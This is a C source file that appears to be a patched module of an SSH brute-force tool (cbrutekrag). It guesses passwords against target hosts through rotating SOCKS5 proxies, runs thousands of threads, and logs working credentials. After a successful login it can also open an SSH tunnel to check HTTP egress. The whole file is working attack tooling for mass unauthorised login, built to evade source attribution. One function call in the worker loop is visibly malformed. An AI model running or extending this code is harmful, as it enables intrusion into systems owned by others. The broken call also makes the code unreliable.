/* FULLY PATCHED bruteforce_proxy_ssh.c
 * - Race-condition fixed
 * - Safe for 10,000+ threads
 * - Original debug spam preserved
 * - Original A1 HTTP-check tunnel preserved
 * - Proxy mode fully functional
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#include <libssh/libssh.h>
#include <pthread.h>

#include "cbrutekrag.h"
#include "log.h"
#include "proxy.h"

/* ========================================================================== */
/*  PROXY LOGIN (with A1 HTTP-check block restored)                           */
/* ========================================================================== */

int bruteforce_ssh_login_proxy(btkg_context_t *context, const char *hostname,
			       uint16_t port, const char *username,
			       const char *password,
			       const char *proxy_ip, uint16_t proxy_port)
{
	ssh_session session = NULL;
	int verbosity = 0;
	btkg_options_t *options = &context->options;

	if (options->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
		verbosity = SSH_LOG_PROTOCOL;
	} else {
		verbosity = SSH_LOG_NOLOG;
	}

	session = ssh_new();
	if (session == NULL) {
		log_error("Cant create SSH session.");
		return -1;
	}

	if (!proxy_ip || proxy_ip[0] == '\0' || proxy_port == 0) {
		log_error("Invalid proxy provided to bruteforce_ssh_login_proxy.");
		ssh_free(session);
		return -1;
	}

	int proxied_fd = -1;
	if (btkg_proxy_socks5_connect(context, proxy_ip, proxy_port,
				      hostname, port, &proxied_fd) != 0) {
		log_debug("Failed to connect to %s:%u via proxy %s:%u",
			  hostname, (unsigned)port, proxy_ip,
			  (unsigned)proxy_port);
		ssh_free(session);
		return -1;
	}

	int timeout = options->timeout;
	ssh_options_set(session, SSH_OPTIONS_HOST, hostname);
	ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	ssh_options_set(session, SSH_OPTIONS_PORT, &(int){ port });
	ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
	ssh_options_set(session, SSH_OPTIONS_USER, username);
	ssh_options_set(session, SSH_OPTIONS_FD, &proxied_fd);

	int r = ssh_connect(session);
	if (r != SSH_OK) {
		if (options->verbose & CBRUTEKRAG_VERBOSE_MODE) {
			log_error("[!] Error connecting to %s:%d %s.", hostname,
				  port, ssh_get_error(session));
		}
		if (proxied_fd >= 0) close(proxied_fd);
		ssh_free(session);
		return -1;
	}

	r = ssh_userauth_none(session, NULL);
	if (r == SSH_AUTH_SUCCESS) {
		log_debug("[!] %s:%d - Server without authentication.", hostname, port);
		ssh_disconnect(session);
		ssh_free(session);
		if (proxied_fd >= 0) close(proxied_fd);
		return -1;
	}

	if (r == SSH_AUTH_ERROR) {
		log_debug("[!] %s:%d - ssh_userauth_none(): A serious error happened.", hostname, port);
		ssh_disconnect(session);
		ssh_free(session);
		if (proxied_fd >= 0) close(proxied_fd);
		return -1;
	}

	int method = ssh_userauth_list(session, NULL);

	if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
		r = ssh_userauth_password(session, NULL, password);
		if (r == SSH_AUTH_SUCCESS) {

			/* ---------------- A1 — RESTORED HTTP-CHECK BLOCK ---------------- */
			if (options->check_http != NULL) {

				ssh_channel channel = ssh_channel_new(session);
				if (channel == NULL) {
					log_error("Error ssh_channel_new: %s", ssh_get_error(session));
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -2;
				}

				log_debug("%s:%d %s %s - Opening tunnel (via proxy)...",
					  hostname, port, username, password);

				r = ssh_channel_open_forward(channel,
					options->check_http, 80,
					"localhost", 0);

				if (r != SSH_OK) {
					log_error("Error ssh_channel_open_forward: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -3;
				}

				char buffer[1024];
				int nbytes;
				snprintf(buffer, sizeof(buffer),
					 "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
					 options->check_http);

				r = ssh_channel_write(channel, buffer, (uint32_t)strlen(buffer));
				if (r == SSH_ERROR) {
					log_error("Error ssh_channel_write: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -4;
				}

				nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
				if (nbytes == 0) {
					log_warn("%s:%d %s %s - http-check empty response",
						  hostname, port, username, password);
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -6;
				}

				if (nbytes < 0) {
					log_error("Error ssh_channel_read: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -5;
				}

				if (channel) {
					ssh_channel_close(channel);
					ssh_channel_free(channel);
				}
			}
			/* -------------------------------------------------------------- */

			ssh_disconnect(session);
			ssh_free(session);
			if (proxied_fd >= 0) close(proxied_fd);
			return 0;
		}
	}

	ssh_disconnect(session);
	ssh_free(session);
	if (proxied_fd >= 0) close(proxied_fd);
	return -1;
}

/* ========================================================================== */
/*  WRAPPER                                                                   */
/* ========================================================================== */

int bruteforce_ssh_try_login_proxy(btkg_context_t *context, const char *hostname,
				   const uint16_t port, const char *username,
				   const char *password,
				   const char *proxy_ip, uint16_t proxy_port)
{
	const char *_password =
		strcmp(password, "$TARGET") == 0 ? hostname : password;
	const char *_username =
		strcmp(username, "$TARGET") == 0 ? hostname : username;

	int ret = bruteforce_ssh_login_proxy(context,
		hostname, port, _username, _password,
		proxy_ip, proxy_port);

	if (ret == 0) {
		log_info("\033[32m[+]\033[0m %s:%d %s %s",
		         hostname, port, _username, _password);

		if (context->output != NULL) {
			btkg_log_successfull_login(context->output,
				context->options.bruteforce_output_format,
				hostname, port, _username, _password);
		}
	} else {
		log_debug("\033[38m[-]\033[0m %s:%d %s %s",
		          hostname, port, _username, _password);
	}

	return ret;
}

/* ========================================================================== */
/*  WORKER (FULL DEBUG + RACE-FIX)                                            */
/* ========================================================================== */

static void *btkg_bruteforce_worker_proxy(void *ptr)
{
	fprintf(stderr, "[WORKER] Thread started, ptr=%p\n", ptr);
	fflush(stderr);

	btkg_context_t *context = (btkg_context_t *)ptr;

	fprintf(stderr, "[WORKER] Context cast successful\n");
	fflush(stderr);

	btkg_target_list_t *targets = &context->targets;
	btkg_credentials_list_t *credentials = &context->credentials;
	btkg_proxy_list_t *proxies = &context->proxies;
	btkg_options_t *options = &context->options;

	fprintf(stderr, "[WORKER] All pointers assigned\n");
	fflush(stderr);

	for (;;) {

		/* ------------- CRITICAL RACE-FREE BLOCK ------------- */
		pthread_mutex_lock(&context->lock);

		/* Roll targets */
		if (context->targets_idx >= targets->length) {
			context->targets_idx = 0;
			context->credentials_idx++;

			if (proxies->count > 0) {
				context->proxies_idx++;
				if (context->proxies_idx >= proxies->count)
					context->proxies_idx = 0;
			}
		}

		if (context->credentials_idx >= credentials->length) {
			pthread_mutex_unlock(&context->lock);
			fprintf(stderr, "[WORKER] Thread exiting (no more work)\n");
			fflush(stderr);
			break;
		}

		/* Copy values locally before unlocking — FIXES race */
		size_t t_idx = context->targets_idx++;
		size_t c_idx = context->credentials_idx;
		size_t p_idx = context->proxies_idx;

		context->count++;

		pthread_mutex_unlock(&context->lock);
		/* ----------------------------------------------------- */

		/* Bounds safety */
		if (t_idx >= targets->length || c_idx >= credentials->length)
			continue;

		btkg_target_t *target = &targets->targets[t_idx];
		btkg_credentials_t *combo = &credentials->credentials[c_idx];

		const char *proxy_ip = NULL;
		uint16_t proxy_port = 0;

		if (proxies->count > 0 && p_idx < proxies->count) {
			btkg_proxy_t *px = &proxies->proxies[p_idx];
			proxy_ip = px->ip;
			proxy_port = px->port;
		}

		if (!options->dry_run) {

			int ret = bruteforce_ssh_try_login_proxy(
				context,
				target->host, target->port,
			 

(combo->username, combo->password,
				proxy_ip, proxy_port);

			if (ret == 0) {
				pthread_mutex_lock(&context->lock);
				context->successful++;
				pthread_mutex_unlock(&context->lock);
			}

		} else {
			const char *pstr = proxy_ip ? proxy_ip : "no-proxy";
			log_debug("[-] %s:%d %s %s (proxy=%s:%u)",
				  target->host, target->port,
				  combo->username, combo->password,
				  pstr, (unsigned)proxy_port);
		}
	}

	fprintf(stderr, "[WORKER] Thread returning\n");
	fflush(stderr);
	return NULL;
}

/* ========================================================================== */
/*  START FUNCTION (FULL DEBUG, HEAP THREAD ARRAY, NO STACK OVERFLOW)        */
/* ========================================================================== */

void btkg_bruteforce_start_proxy(btkg_context_t *context)
{
	btkg_options_t *options = &context->options;

	fprintf(stderr, "[DEBUG] Starting proxy bruteforce\n");
	fprintf(stderr, "[DEBUG] max_threads = %zu\n", options->max_threads);
	fprintf(stderr, "[DEBUG] proxies.count = %zu\n", context->proxies.count);
	fprintf(stderr, "[DEBUG] targets.length = %zu\n", context->targets.length);
	fprintf(stderr, "[DEBUG] credentials.length = %zu\n", context->credentials.length);
	fflush(stderr);

	pthread_t *threads =
		malloc(options->max_threads * sizeof(pthread_t));
	if (!threads) {
		log_error("Failed to allocate memory for %zu threads",
			  options->max_threads);
		return;
	}

	fprintf(stderr, "[DEBUG] Thread array allocated successfully at %p\n",
	        (void*)threads);
	fflush(stderr);

	size_t created = 0;
	for (size_t i = 0; i < options->max_threads; i++) {

		fprintf(stderr, "[DEBUG] Creating thread %zu/%zu...\n",
			i + 1, options->max_threads);
		fflush(stderr);

		int ret = pthread_create(
			&threads[i], NULL,
			btkg_bruteforce_worker_proxy,
			(void*)context);

		if (ret != 0) {
			log_error("Thread creation failed at index %zu: %d",
				  i, ret);
			break;
		}

		created++;

		if ((i + 1) % 100 == 0) {
			fprintf(stderr,
				"[DEBUG] Successfully created %zu threads so far\n",
				i + 1);
			fflush(stderr);
		}
	}

	fprintf(stderr, "[DEBUG] Created %zu/%zu threads successfully\n",
	        created, options->max_threads);
	fprintf(stderr, "[DEBUG] Now joining threads...\n");
	fflush(stderr);

	for (size_t i = 0; i < created; i++) {
		if ((i + 1) % 100 == 0) {
			fprintf(stderr,
				"[DEBUG] Joined %zu threads so far\n",
				i + 1);
			fflush(stderr);
		}

		pthread_join(threads[i], NULL);
	}

	fprintf(stderr, "[DEBUG] All threads joined, freeing thread array\n");
	fflush(stderr);

	free(threads);

	fprintf(stderr, "[DEBUG] btkg_bruteforce_start_proxy completed\n");
	fflush(stderr);
}
